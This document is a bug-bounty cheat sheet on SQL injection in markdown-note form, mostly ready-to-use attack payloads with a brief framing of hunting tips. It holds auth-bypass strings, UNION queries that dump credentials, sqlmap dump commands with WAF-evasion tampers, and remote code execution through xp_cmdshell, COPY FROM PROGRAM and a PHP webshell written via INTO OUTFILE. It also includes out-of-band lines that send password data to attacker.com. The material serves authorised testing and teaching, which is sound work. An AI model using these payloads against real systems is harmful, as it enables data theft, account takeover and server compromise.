---
tags: [bugbounty, vuln/sqli, cheatsheet, p1, p2]
aliases: [SQL Injection, SQLi]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# SQLi — SQL Injection

> [!tldr] Hunter Summary
> **What:** Unsanitized user input alters SQL query logic.
> **Impact:** Data exfil, auth bypass, RCE (via xp_cmdshell / INTO OUTFILE / UDF).
> **Best targets:** Login forms, search, filter/sort params, REST API filters, GraphQL args.
> **Time to triage:** Single quote test → error? 5 min. Blind: use sqlmap with --level=5.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| URL params | `?id=1`, `?page=2`, `?category=phones`, `?sort=name` |
| Login forms | `username=`, `password=` (auth bypass) |
| Search | `?q=`, `?search=`, `?keyword=` |
| REST APIs | `/api/products?filter=price>100` |
| JSON body params | `{"id": 1}`, `{"order": "price ASC"}` |
| Headers | `X-Forwarded-For`, `User-Agent`, `Referer` (some apps log and query these) |
| Cookies | Session cookies containing IDs |
| GraphQL | `query { products(category: "shoes") }` |

---

## Step-by-Step Hunt

### Step 1 — Error-based detection
```
# Single quote test
GET /items?id=1'
# Errors like: "You have an error in your SQL syntax" = confirmed

# Different DBs
id=1'    -- MySQL
id=1'    -- PostgreSQL  
id=1'    -- MSSQL
id=1'||'  -- Oracle
id=1\    -- MySQL escape bypass
```

### Step 2 — Boolean-based blind detection
```
id=1 AND 1=1   (true — same as normal response)
id=1 AND 1=2   (false — different response)
id=1 AND SLEEP(5)  (time-based — delays response 5s)
```

### Step 3 — Find column count (UNION-based)
```
id=-1 ORDER BY 1    (no error)
id=-1 ORDER BY 2    (no error)
id=-1 ORDER BY 3    (no error)
id=-1 ORDER BY 4    (error = 3 columns)

# Then UNION
id=-1 UNION SELECT 1,2,3      (MySQL)
id=-1 UNION SELECT NULL,NULL,NULL  (PostgreSQL)
```

### Step 4 — Extract data (MySQL)
```sql
-- DB version
-1 UNION SELECT 1,2,version()

-- Database name
-1 UNION SELECT 1,2,database()

-- All databases
-1 UNION SELECT 1,2,schema_name FROM information_schema.schemata

-- Tables in current DB
-1 UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema=database()

-- Columns
-1 UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'

-- Dump credentials
-1 UNION SELECT 1,username,password FROM users
```

### Step 5 — Auth bypass
```
# Login form bypass
username: admin'--
username: admin'#
username: admin'/*
username: ' OR 1=1--
username: ' OR '1'='1
username: ' OR 1=1#
password: anything

# Full bypass
' OR 1=1-- -
' OR 'x'='x
') OR ('1'='1
admin'--
```

### Step 6 — Automate with sqlmap
```bash
# Basic GET parameter
sqlmap -u "https://target.com/page?id=1" --dbs

# POST request (capture in Burp, save as request.txt)
sqlmap -r request.txt --dbs --level=5 --risk=3

# Cookie injection
sqlmap -u "https://target.com/page" --cookie="session=VALUE;id=1" -p id --dbs

# API / JSON
sqlmap -u "https://target.com/api/users" --data='{"id": 1}' --dbs

# With WAF bypass
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between,randomcase --dbs

# Dump specific table
sqlmap -u "https://target.com/?id=1" -D dbname -T users --dump
```

### Step 7 — OOB/DNS exfil (blind, no output)
```sql
-- MySQL (needs FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share'
```

---

## Payload Vault

### MySQL
```sql
-- Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1) --

-- Time-based
' AND SLEEP(5) --
1; WAITFOR DELAY '0:0:5' --  (MSSQL)

-- Stacked queries (if supported)
'; INSERT INTO logs VALUES (@@version)--

-- File read/write
UNION SELECT LOAD_FILE('/etc/passwd')
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

### PostgreSQL
```sql
-- RCE via COPY
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Version
SELECT version()
SELECT current_database()
SELECT current_user

-- File read  
COPY tmp_table FROM '/etc/passwd'
```

### MSSQL
```sql
-- RCE
EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- Current user
SELECT system_user
SELECT is_srvrolemember('sysadmin')
```

---

## WAF Bypass

```sql
-- Space bypass
/**/  %09  %0a  %0d  %0b

-- Case variation
SeLeCt  UnIoN  wHeRe

-- Comment variation
UNION/**/SELECT  UN/**/ION  /*!UNION*/

-- URL encoding
%55nion  %53elect  (U=0x55, S=0x53)

-- Inline comment
UNION /*!SELECT*/ 1,2,3

-- Scientific notation bypass
id=1e0 UNION SELECT...
```

---

## 2025-2026 Updates

> [!info] New SQLi surface (2025-2026)
> - **AI query builders:** Natural language → SQL features ("find users who...") often pass user input unsanitized to dynamic query builders
> - **ORM raw query misuse:** Hibernate `.createNativeQuery(userInput)`, Django `.raw(f"SELECT... {user_input}")` — grep for these
> - **Second-order SQLi:** Input is stored safely, then retrieved and inserted into a query without escaping — test by storing `admin'--` as a username
> - **GraphQL argument injection:** `query { users(filter: "name='a' OR 1=1--") }` — often less scrutinized
> - **Batch API SQLi:** JSON batch endpoints with array of IDs — `[1, "1 UNION SELECT...", 3]`

---

## Chain Ideas

| SQLi → | Result |
|--------|--------|
| SQLi → credential dump | → Crack hashes → ATO |
| SQLi → INTO OUTFILE | → RCE via webshell |
| MSSQL SQLi | → xp_cmdshell → OS command execution |
| PostgreSQL SQLi | → COPY FROM PROGRAM → RCE |
| Blind SQLi → SSRF | → DNS exfil of sensitive data |

---

## Tools

| Tool | Use |
|------|-----|
| `sqlmap` | Gold standard automation, use with `-r request.txt` |
| `ghauri` | More evasive than sqlmap, good for WAF bypass |
| `havij` | Legacy Windows GUI (still used for quick detection) |
| Burp Active Scanner | Catches basic SQLi in all params |

---

## References

- PortSwigger SQL injection — https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings SQLi — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- HackTricks SQLi — https://book.hacktricks.xyz/pentesting-web/sql-injection
